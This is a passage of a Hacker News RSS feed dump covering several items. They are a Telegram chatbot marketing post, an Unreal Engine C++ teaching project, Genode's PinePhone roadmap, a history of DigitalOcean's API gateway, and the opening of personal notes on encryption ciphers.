<p><img loading="lazy" src="https://botpenguin.com/wp-content/uploads/2021/01/telegram-chat-bot-300x150.png" alt="telegram chatbot" width="580" height="291" srcset="https://botpenguin.com/wp-content/uploads/2021/01/telegram-chat-bot-300x150.png 300w, https://botpenguin.com/wp-content/uploads/2021/01/telegram-chat-bot-768x384.png 768w, https://botpenguin.com/wp-content/uploads/2021/01/telegram-chat-bot.png 874w" sizes="(max-width: 580px) 100vw, 580px"></p>
<h3>It‚Äôs Free</h3>
<p>As you already know, Telegram is free, whatever the number of SMS you send or receive per day or the reason for which you use the platform (professional or personal use). This has no specific limitations and can support your company in obtaining potential customers and building a better online presence. If you are thinking of deploying or <a href="https://app.botpenguin.com/authentication">creating a bot for Telegram</a>, you do not need to spend stacks of money. The entire telegram bot construction process is also feasible and free. Therefore, whether you are a small business or a great brand getting a bot in Telegram is easy.</p>
<p>You can attract your customers with useful information, photos, videos, and even voice messages to let them build trust in your brand. Hence, have a strong marketing strategy and let your brand work effectively and efficiently.</p>
<h3>Better Engagement</h3>
<p>Telegraphic Messenger is one of the fantastic ways to promote your brand and let your audience base know who you are. When it comes to engaging customers over, you must have a clear and straightforward idea while interacting with the customers. A complicated service or tone can lead to unsatisfied customers. But here comes the twist, a telegram bot can support businesses to have a better interaction 24/7 without any further delay. With better and organized promotional campaigns, a bot for Telegram can let you raise your customer base.</p>
<p>Simplify your bot‚Äôs tone and let the conversation flow to impress the customers instantly, allow them to execute the whole purchasing process by a bot without jumping over multiple pages. A bot in Telegram can also remind the customers about the new offers, discounts, product launches, and even track of their activities and needed improvements. So, what are you waiting for, have it soon!</p>
<h3>Promotion and Advertising</h3>
<p>When you have a social media platform like Telegram, why opt for expensive advertising activities? Just a single message for your customers with the relevant information can make your brand‚Äôs presence better every day. Hence, a free telegram bot with powerful prompting tools and strategy can make your business more productive. It would also let you earn more revenue and better productivity as a whole. We know what role marketing plays in this digital world, so don‚Äôt compromise with and have the smart tools to lead you through immense success. So, be it a sale or opening of the new store you must let your customers know it.</p>
<h3>Secure</h3>
<p>The most fantastic part of Telegram is that it is highly secure, and nobody still managed to hack it. Thus its makers are proud of that fact. This makes it quite a good reason to use it for business purposes as it will safeguard all your data and your customer‚Äôs. It will give you and your costumes a secure and better place to interact regarding products and services. Hence, you can serve them with high-end technology without any hindrance. A bot for Telegram can make it possible to automate your brand‚Äôs profile and do all the repetitive tasks.</p>
<p>A can provide a quick solution and understands the context of their complaint as any other human agent.</p>
<h3>Availability</h3>
<p>The telegram messenger covers all major platforms such as Android, iOS, windows phone with desktop apps for Mac, Linux, and Windows. Furthermore, it also has a web version, which will allow you to target your prospects on a vast scale. Second, you don‚Äôt have to worry that your customers won‚Äôt access this messenger. With a telegram bot, you can let your customers have the information quickly, and they can use it from anywhere and anytime without any problem.<br>
Ease of availability increases the opportunity to find prospective buyers and higher conversion rates. Then get ready to enjoy the ultimate adventure in this digital market with the bot in Telegram.</p>
<h3>Transactions</h3>
<p>You would be surprised to be able to complete transactions using a telegram. Therefore, when you are in business, carrying out transactions of your customers happens quite frequently. In such a case, why not give a rapid and transparent platform for them to let the transactions proceed smoothly. Currently, this functionality is available in Russia and brazil. However, we believe it will soon be available in other countries as well. A telegram bot may let the client transfer money or pay for a minute without going to other pages or portals.</p>
<h3>Conclusion</h3>
<p>Telegram isn‚Äôt only the way to reach, target, and keep in touch with the prospects but also a powerful tool to automate CSS and optimize multiple processes to minimize manual work. For this, you can have a bot for Telegram responsible for a specific role and let it work without any human intervention. In case you are confused about how to own a telegram bot, you must visit BotPenguin and have a smart bot instantly.</p>

</div>
</div><div>

<p>Bhavya works as Digital Marketing Team Lead and looks closely into the marketing team. Her passion and expertise in refurbishing the way users connect to the product leads to ultimate satisfaction via SEO friendly content.
</p>
</div></div>]]>
            </description>
            <link>https://botpenguin.com/what-is-a-telegram-bot-reasons-to-use-bot-for-telegram/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800876</guid>
            <pubDate>Sat, 16 Jan 2021 08:08:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New ‚ÄòAction Roguelike‚Äô C++ Project on GitHub]]>
            </title>
            <description>
<![CDATA[
Score 129 | Comments 49 (<a href="https://news.ycombinator.com/item?id=25800771">thread link</a>) | @todsacerdoti
<br/>
January 15, 2021 | https://www.tomlooman.com/action-roguelike-cpp-ue4/ | <a href="https://web.archive.org/web/*/https://www.tomlooman.com/action-roguelike-cpp-ue4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>For the <a rel="noreferrer noopener" href="https://www.tomlooman.com/stanford-cs193u/" target="_blank">Stanford University Fall 2020 Curriculum</a>, I built a small game project using mainly C++ mixed with some Blueprint in Unreal Engine. For those interested, the entire Computer Science course (CS193U) was provided through Zoom lectures and has been recorded. I‚Äôm working on getting this published and meanwhile, this project is already <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">open-source through GitHub</a> to be taken apart by anyone! </p>
<div><figure><img loading="lazy" width="900" height="490" src="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1" alt="" srcset="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1 900w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=768%2C418&amp;ssl=1 768w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?w=1222&amp;ssl=1 1222w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1 900w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=768%2C418&amp;ssl=1 768w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?w=1222&amp;ssl=1 1222w" data-lazy-src="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div><p><strong>Check out the project file <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">right here</a></strong> <strong>on GitHub!</strong></p><h2>Description</h2>
<p>The game was built with a wide set of features to cover a variety of useful coding concepts to students including AI, multiplayer programming, save games, async asset loading, etc. Check out the non-exhaustive list of features below, I‚Äôm sure there is more that I forgot to include or that will drip in at a later time.</p>
<p>Those interested in a GAS (<a href="https://docs.unrealengine.com/en-US/InteractiveExperiences/GameplayAbilitySystem/index.html" target="_blank" rel="noreferrer noopener">Gameplay Ability System</a>) style design might be keen to check out how we handled Abilities (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SAction.h" target="_blank" rel="noreferrer noopener">Action.h</a>) and Buffs/Debuffs (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SActionEffect.h" target="_blank" rel="noreferrer noopener">ActionEffect.h</a>) as this shares many similarities with GAS design, albeit its much simpler.</p>
<p>At the time of writing, there isn‚Äôt a whole lot that makes this a real ‚Äòroguelike‚Äô with things like permadeath or proper RNG. But, I hope to extend this project later on with more relevant features to have a proper game loop to earn the name ‚ÄòAction Roguelike‚Äô.</p>
<figure><p> <iframe title="Action Roguelike Combat Sample [Unreal Engine]" width="900" height="506" src="https://www.youtube.com/embed/8jDCtT88bdk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></figure>
<figure><p> <iframe title="CS193U: Blackhole Projectile Assignment Example" width="900" height="506" src="https://www.youtube.com/embed/uSOEPkX3OtI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></figure>
<h2>Features</h2>
<p>Below I‚Äôve listed some of the more relevant features included in the project. I think these code samples can be invaluable in getting an idea on how to use them in the Unreal Engine eco-system. Especially things like Asset Manager have limited public examples, which is one of the benefits of this open-source project.</p>
<ul><li>Third-person Action Character Movement</li><li><strong>Action System</strong>&nbsp;(Gameplay Ability System-lite)<ul><li>Dash Ability (Teleporting via projectile)</li><li>Blackhole Ability</li><li>Magic Projectile Attack</li><li>‚ÄúThorns‚Äù buff (reflecting damage)</li><li>Burning Damage-over-time effect</li></ul></li><li>AttributeComponent (Health, Rage etc.)</li><li><strong>SaveGame System</strong>&nbsp;for persisting progress of character and world state.</li><li>Heavy use of Events to drive UI and gameplay reactions.</li><li>Mix of C++ &amp; Blueprint and how to combine these effectively.</li><li><strong>GameplayTags</strong> to mark-up Actors, Buffs, Actions.</li><li><strong>Multiplayer support</strong>&nbsp;for all features</li><li>GameMode Logic<ul><li>EQS for binding bot/powerup spawn locations.</li><li>Bot spawning system (bots cost points to spawn, gamemode gains points over time to spend)</li><li>DataTable holds bot information</li><li>DataAssets to hold enemy configurations</li></ul></li><li><strong>Asset Manager:</strong>&nbsp;Async loading of data assets</li><li>Async loading of UI icons</li><li>AI (Ranged Shooter style)<ul><li>Minion AI with Behavior Trees (Roam, See, Chase, Attack, Flee/Heal)</li><li>C++ Custom Behavior Trees Nodes</li><li>EQS for attack/cover locations by AI Powerups</li></ul></li><li>Powerup pickups to heal, gain credits/actions (UMG)</li><li>Main menu to host/join game (UMG)</li><li>UI elements for player attributes and projected widgets for powerups and enemy health.</li><li>C++ Localized Text Example</li></ul>
<p><strong>Check out the project file <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">right here</a></strong> <strong>on GitHub!</strong></p><div><figure><img loading="lazy" width="900" height="463" src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=900%2C463&amp;ssl=1" alt="" srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?w=900&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=768%2C395&amp;ssl=1 768w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?w=900&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=768%2C395&amp;ssl=1 768w" data-lazy-src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=900%2C463&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Spotted by Minion‚Äôs sight sense.</figcaption></figure></div><div><figure><a href="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?ssl=1" data-rel="lightbox-image-0" data-rl_title="" data-rl_caption="" title=""><img loading="lazy" width="900" height="532" src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1" alt="" srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=768%2C454&amp;ssl=1 768w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?w=1280&amp;ssl=1 1280w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=768%2C454&amp;ssl=1 768w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?w=1280&amp;ssl=1 1280w" data-lazy-src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a><figcaption>Behavior Tree for Ranged Minion AI</figcaption></figure></div><h2>What‚Äôs Next?</h2>
<p>There is still a decent chunk of features I would like to add, including adding a proper game loop, items/abilities, Steamworks, etc. Whether these will actually see the light of day depends on many factors ‚Äì including the final shape of the existing course recordings.</p>
</div></div>]]>
            </description>
            <link>https://www.tomlooman.com/action-roguelike-cpp-ue4/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800771</guid>
            <pubDate>Sat, 16 Jan 2021 07:34:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Genode OS Framework is adding PinePhone support]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25800741">thread link</a>) | @todsacerdoti
<br/>
January 15, 2021 | https://linuxsmartphones.com/genode-os-framework-is-adding-pinephone-support/ | <a href="https://web.archive.org/web/*/https://linuxsmartphones.com/genode-os-framework-is-adding-pinephone-support/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><section id="primary"><main id="main"><div><article id="post-546"><div><p>There are <a href="https://wiki.pine64.org/index.php/PinePhone_Software_Releases">more than a dozen different operating systems</a> that can run on the PinePhone at the moment, and most of them have one thing in common: a Linux kernel. But later this year you may be able to install something a little different.</p><p><strong><a href="https://genode.org/">Genode</a> </strong>is a free and open source, security-focused operating system framework that‚Äôs <em>not</em> based on Linux. It‚Äôs a cross-platform tool kit for building operating systems that can run on x86, ARM, or RISC-V hardware with as little as 4MB of RAM.</p><p>And according to a new <a href="https://genode.org/about/road-map">roadmap for 2021</a>, the developers plan to add support for the PinePhone this year.</p><figure id="attachment_550" aria-describedby="caption-attachment-550"><a href="https://genode.org/about/screenshots"><img data-attachment-id="550" data-permalink="https://linuxsmartphones.com/genode-os-framework-is-adding-pinephone-support/genode-sculpt-os/" data-orig-file="https://linuxsmartphones.com/wp-content/uploads/2021/01/genode-sculpt-os.jpg" data-orig-size="1200,675" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="genode sculpt os" data-image-description="" data-medium-file="https://linuxsmartphones.com/wp-content/uploads/2021/01/genode-sculpt-os-400x225.jpg" data-large-file="https://linuxsmartphones.com/wp-content/uploads/2021/01/genode-sculpt-os-780x439.jpg" loading="lazy" src="https://linuxsmartphones.com/wp-content/uploads/2021/01/genode-sculpt-os-780x439.jpg" alt="" width="780" height="439" srcset="https://linuxsmartphones.com/wp-content/uploads/2021/01/genode-sculpt-os-780x439.jpg 780w, https://linuxsmartphones.com/wp-content/uploads/2021/01/genode-sculpt-os-400x225.jpg 400w, https://linuxsmartphones.com/wp-content/uploads/2021/01/genode-sculpt-os-768x432.jpg 768w, https://linuxsmartphones.com/wp-content/uploads/2021/01/genode-sculpt-os.jpg 1200w" sizes="(max-width: 780px) 100vw, 780px"></a><figcaption id="caption-attachment-550">Genode / Sculpt OS 20.08</figcaption></figure><p>The goal is to offer a feature phone-like version of Genode for the Pinephone with basic functionality including:</p><ul><li>Phone calls</li><li>SMS</li><li>Mobile data</li><li>Web browsing</li></ul><p>In order to make that happen the team needs to first port its kernel and framework to work on devices with an Allwinner A64 processor, and by May the goal is to have <a href="https://genode.org/download/sculpt">Sculpt OS</a> ported to the PinePhone to provide basic operating system functionality, and by August the roadmap calls for a working touchscreen, display, and web browser.</p><p>If everything goes according to plan, cellular functionality should be working by November, allowing users to use the PinePhone as‚Ä¶ you know, a phone.</p><p>You can find more details in the roadmap, or visit the Genode website to <a href="https://genode.org/about/index">find out more about the OS framework</a>.</p><p><a href="https://www.phoronix.com/scan.php?page=news_item&amp;px=Genode-OS-2021-Roadmap"><em>Phoronix</em></a></p><section id="text-2"></section><section id="ai_widget-3"></section><section id="custom_html-7"><div><div><p>At LinuxSmartphones.com we strive to provide timely news, opinion, and how-to articles related to the Linux phone space. But it takes time and money to keep this site alive, and while advertising is our primary source of revenue, there are several other ways you can help support this website, even if you're using an ad blocker.*</p><h3>Contribute to our <a href="https://www.patreon.com/bradlinder">Patreon campaign</a></h3><p>
<em>or...</em></p><h3>Contribute via <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&amp;hosted_button_id=PTBQ9EKAYTZBS&amp;source=url">PayPal</a></h3><p>
* If you <em>are</em> using an ad blocker like uBlock Origin and seeing a pop-up message at the bottom of the screen, this<a target="blank_" href="https://liliputing.com/2020/09/ublock-origin-how-to-hide-googles-script-blocking-warning-for-websites-using-funding-choices.html" rel="noopener">guide that may help you disable it.</a></p></div></div></section></div></article></div></main></section></div></div>]]>
            </description>
            <link>https://linuxsmartphones.com/genode-os-framework-is-adding-pinephone-support/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800741</guid>
            <pubDate>Sat, 16 Jan 2021 07:25:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building DigitalOcean's API Gateway]]>
            </title>
            <description>
<![CDATA[
Score 160 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25800237">thread link</a>) | @chynkm
<br/>
January 15, 2021 | https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html | <a href="https://web.archive.org/web/*/https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
	<p>TL;DR: this is mostly a text version of a presentation I‚Äôve done a couple times (<a href="https://www.youtube.com/watch?v=S8OQfB6JSf8">English</a> or <a href="https://www.youtube.com/watch?v=Ld8UFU-DB1U">Portuguese</a>) on the history of building DigitalOcean‚Äôs API gateway. How we made it easier for folks to build new microservices instead of continuing to add code to our monoliths, the successes, failures and lessons learned.</p>

<p>First, where were we?</p>

<p>DigitalOcean had 3 monoliths back in 2016 when we started (all 3 are still alive today, albeit much smaller than they were before). Why were there 3? There is a shared library that contains most of the logic that all 3 applications use, so in reality we had one ‚Äúmonolith library‚Äù that was reused at all 3, most logic changes were made into this library and then it would be upgraded at every single app separately. The library still exists today and continues to be updated every once in a while.</p>

<p>As you can imagine, as more and more changes started to happen, with the company growing incredibly fast both in terms of business and hiring, this wasn‚Äôt ideal. Many times someone would change this core library, deploy one of the apps (the control pane you see when you sign in), but not the JSON API. So you could end up with a new feature visible at the control panel but not at the API. There would always be a time when this library version wouldn‚Äôt match across all applications, as we were not deploying them all at once every single time, so there was always space for there to be a mismatch of features available.</p>

<p>This also meant that the test suite was growing by leaps and bounds, getting slower, making running the test suite and deployments a pain. There was growing interest in doing something about this, but we couldn‚Äôt just migrate everything out. There was also a lot of interest in NOT doing Ruby anymore. There was a growing body of Golang code all over the place and people wanted to use it for their new services instead of building it all inside the old monoliths.</p>

<p>There was a catch here though, how could they possibly do all the things the Rails apps were doing, like authentication, rate limiting, authorization, feature flipping, routing, error handling and all the shared logic, in a new language, without repeating the same thing across all new projects?</p>

<p>We needed something that would be language agnostic and could be run side by side with the existing monoliths. At this point we knew a library ( like Twitter‚Äôs Finagle) wasn‚Äôt an option. Our solution had to work with the old Ruby code and the new Golang stuff (and JS, maybe Python. It was all up in the air back then). We wouldn‚Äôt be able to build a library with all the shared features needed in multiple languages.This is where the API gateway comes in.</p>



<p>The microservices.io patterns list has a great definition for the <a href="https://microservices.io/patterns/apigateway.html">API gateway</a>:</p>

<div><div><pre><code>Implement an API gateway that is the single entry point for all clients. The API gateway handles requests in one of two ways. Some requests are simply proxied/routed to the appropriate service. It handles other requests by fanning out to multiple services. 
</code></pre></div></div>

<p>It took us multiple meetings and discussions between Joonas Bergius, Nan Zhong, Joe Friedl, me and even Phil Cal√ßado, who was the engineering lead (not sure if this was actually the title but he was the boss), to come to the realization that we were going to build an API gateway.</p>

<p>What came out of the brainstorms:</p>

<ul>
  <li>It was going to be a pure HTTP proxy, no GRPC, GraphQL or other special protocols;</li>
  <li>We would not change request or response bodies, so there wouldn‚Äôt be any protocol translation. Applications would be responsible for parsing the input and producing valid outputs, in the format the client was expecting;</li>
  <li>We‚Äôd augment the requests and responses with extra information encoded as HTTP headers, including user information, rate limiting details, tracing metadata, features enabled, so all downstream applications would have to do was looking at the headers, not special exchange format.</li>
  <li>Route configuration would be self-service, teams would call a service with their route configuration and the proxy would automatically pick up changes and update it‚Äôs routing table. It would perform basic health checking and remove destinations that weren‚Äôt reachable, but otherwise would take any request and forward it to the registered services.</li>
  <li>It would also include filters that could be run before or after a request was processed, these filters would include authentication, rate limiting, feature flipping and all the other shared pieces teams would need to be available to build apps out of the monoliths.</li>
</ul>

<p>Does it look a lot like Java‚Äôs Servlet API or Ruby‚Äôs Rack? Of course, those were the main inspirations for the design. Going for a simple, well known, design would make us move faster as there would be less stuff to do and we could always complicate it in the future. This was one of the best decisions we made and this is still the way it works nowadays.</p>

<p>Why didn‚Äôt we pick something that existed? Fair question. There really weren‚Äôt many options back then and the ones that did exist did not make it easy to integrate custom code. Our very first challenge was to decrypt and parse Rails sessions to authenticate users, and there was plenty of complex code to decrypt, unmarshal (from Ruby‚Äôs serialization format) and make sense of session data.</p>

<p>Nginx, that was one of the options when we started, only offered integration through Lua scripts, so we‚Äôd have to write this session decrypting and parsing logic in Lua scripts we‚Äôd bundle with our custom Nginx install and that did not feel like a great solution. It was hard to test the scripts, no one had any experience with Lua and the whole setup wasn‚Äôt robust, these scripts were seen mostly as doing small changes in the request flow, not for building complex logic.</p>

<p>So, we started building our own API gateway in Golang.</p>



<p>Once we had the basic proxy built, we placed it in front of some of the traffic, to make sure it could proxy correctly. The first two ‚Äúfilters‚Äù we built were the authentication filters, for Rails sessions and OAuth tokens. To roll these out, we started by ‚Äúdoing‚Äù the filter work for both monoliths but not acting on them, we‚Äôd check if the output we came to in our implementation was the same the monoliths decided on and if the response was also the same; if our own service said a request should be denied but the monoliths responded with an OK or the other way around, we‚Äôd log that and work on figuring out why it didn‚Äôt work.</p>

<p>As we built these filters, another pattern emerged, instead of having all this code inside the API gateway itself, we thought it would be faster to separate the code into a separate service. The initial goal was mostly to make it reusable by other teams if needed and make it easier for us to deploy smaller changes as deploying the gateway itself was a complicated and slow process (due to the way our internal K8s clusters networking was setup back then, we couldn‚Äôt run the gateway on them, so it ran on droplets). After that, almost all filters were just glue code to call an external service that actually knew how to get the job done.</p>

<p><img src="https://mauricio.github.io/images/api-gateway.png" alt="API Gateway simple architecture diagram" title="API Gateway simple architecture diagram"></p>

<p>While it was a response to environmental constraints and not really something we planned, this design made the gateway itself smaller and more reliable. A lot of the logic would live in these microservices instead of the gateway and updates to them had a much smaller blast radius when something went awry.</p>

<p><a href="https://twitter.com/nanzhong">@nanzhong</a> finally switched it to serve all traffic sometime in November 2016, a couple months after our announcement, including full support for authentication with the Rails session and OAuth tokens.</p>



<p>So far we had only done work internally. We weren‚Äôt exposing any of this to other teams yet, as we wanted to verify it was all behaving as expected before letting people register their services. The first integrations were bumpy and the experience for the teams we were integrating with was hard.</p>

<p>We lacked documentation and good examples. Teams had to come to us frequently to make sure their services were really up, their configurations were valid, how routing would work (what options are available? Can I use wildcards? Can I use URL parameters? In what order are routes matched?) and how they should integrate route registration into their workflows. This led to a lot of manual labor on our end helping people do stuff they could be doing themselves had we done the work to make it easier to onboard them. The lesson here was clear, if you‚Äôre working on infrastructure, make sure you can stay out of the way when people are doing their work, you want them to work on their time and not be an impediment for their work.</p>

<p>We also lacked best practices for what the backend services should look like. Multiple teams were being formed of new developers that didn‚Äôt have a lot of experience with building applications with Golang and we did not provide guidance here on how they should set up their applications and what configurations were important.</p>

<p>One recurrent issue we had at the beginning was that <a href="https://golang.org/pkg/net/http/#Server">Golang‚Äôs http.Server</a> class assumes all timeouts are infinite unless you set them (ReadTimeout, ReadHeaderTimeout, WriteTimeout, WriteIdleTimeout) and this would lead to services getting a broken connection from the client (the API gateway) and wouldn‚Äôt know what it was until we checked their configs and noticed they just didn‚Äôt set a value (while we did have a max timeout for all requests on our end, so we‚Äôd close a connection that took too long).</p>

<p>Providing better guidance here for basic options and configurations that teams should be doing in all their apps would have saved a lot of time and effort for everyone.</p>

<p>Next, when registering routes, teams would talk directly to the key-value store we were using to store the routing table (Consul) and as you can imagine this wasn‚Äôt ideal. There was very little validation in place and it was super simple for people to register routes that wouldn‚Äôt load or that wouldn‚Äôt really route anything due to being incomplete. ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</a></em></p>]]>
            </description>
            <link>https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800237</guid>
            <pubDate>Sat, 16 Jan 2021 05:14:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notes on Cryptography Ciphers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25800039">thread link</a>) | @optimalsolver
<br/>
January 15, 2021 | https://rakhesh.com/infrastructure/notes-on-cryptography-ciphers-rsa-dsa-aes-rc4-ecc-ecdsa-sha-and-so-on/ | <a href="https://web.archive.org/web/*/https://rakhesh.com/infrastructure/notes-on-cryptography-ciphers-rsa-dsa-aes-rc4-ecc-ecdsa-sha-and-so-on/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1819">
	
	<!-- .entry-header -->

	<div>
		<p>I thought I should make a running post on cryptography ciphers (algorithms) and such. For instance, in my <a title="Notes on TLS/SSL, RSA, DSA, EDH, ECDHE, and so on ‚Ä¶" href="http://rakhesh.com/infrastructure/notes-on-tlsssl-rsa-dsa-edh-ecdhe-and-so-on/">previous post</a> I mentioned AES, EDH, etc. but that‚Äôs just the tip of the ice-berg as there are so many&nbsp;algorithms each&nbsp;suited for different tasks. As I come across these I‚Äôll add them to this post as a quick reference to myself.&nbsp;</p>
<h2>Symmetric key&nbsp;algorithms&nbsp;(Private&nbsp;key cryptography)</h2>
<p>Both parties share a private key (kept secret between them).</p>
<p>Symmetric key algorithms are what you use for encryption. F0r example: encryption of traffic between a server and client, as well as&nbsp;encryption of&nbsp;data on a disk.&nbsp;</p>
<ul>
<li>DES ‚Äì Data Encryption Standard ‚Äì designed at IBM
<ul>
<li>DES is a standard. The actual algorithm used is also called DES or sometimes DEA (Digital Encryption Algorithm).&nbsp;</li>
<li>DES is now considered insecure (mainly due to a small key size of 56-bits).&nbsp;</li>
<li>Triple DES (3DES) applies the DES algorithm&nbsp;thrice and thus has better practical security. It has 3 keys of 56-bits each (applied to each pass of DES/ DEA).&nbsp;</li>
<li>DES-X is another variant.&nbsp;</li>
<li>DES is a&nbsp;<a href="https://en.wikipedia.org/wiki/Block_cipher" target="_blank">block cipher</a>.</li>
</ul>
</li>
<li>IDEA ‚Äì International Data Encryption Algorithm
<ul>
<li>Considered to be a good and secure algorithm.&nbsp;</li>
<li>Patented but free for non-commercial use.&nbsp;</li>
<li>IDEA&nbsp;is a&nbsp;<a href="https://en.wikipedia.org/wiki/Block_cipher" target="_blank">block cipher</a>.</li>
</ul>
</li>
<li>AES ‚Äì Advanced Encryption Standard ‚Äì is the successor to DES
<ul>
<li>AES is based on the&nbsp;Rijndael cipher. There was a competition to choose the cipher that will become the AES. The&nbsp;Rijndael cipher won the competition. However, <a href="http://blogs.msdn.com/b/shawnfa/archive/2006/10/09/the-differences-between-rijndael-and-aes.aspx" target="_blank">there are some differences</a> between&nbsp;Rijndael and its implementation in AES.&nbsp;</li>
<li>Most CPUs now include hardware AES support making it very fast.</li>
<li>Supported&nbsp;by TrueCrypt, SSH.&nbsp;</li>
<li>AES and Rjindael are <a href="https://en.wikipedia.org/wiki/Block_cipher" target="_blank">block ciphers</a>.&nbsp;</li>
<li>AES can operate in <a href="http://stackoverflow.com/questions/1220751/how-to-choose-an-aes-encryption-mode-cbc-ecb-ctr-ocb-cfb" target="_blank">many modes</a>.
<ul>
<li>AES-GCM (AES operating in Galois/Counter Mode (GCM)) is <a href="https://tools.ietf.org/html/rfc5288" target="_blank">preferred</a>&nbsp;(check <a href="http://blog.cloudflare.com/staying-on-top-of-tls-attacks/" target="_blank">this blog post</a> too). It is fast and secure and works similar to stream ciphers. Can achieve high speeds on low hardware too. Only supported on TLS 1.2 and above.&nbsp;</li>
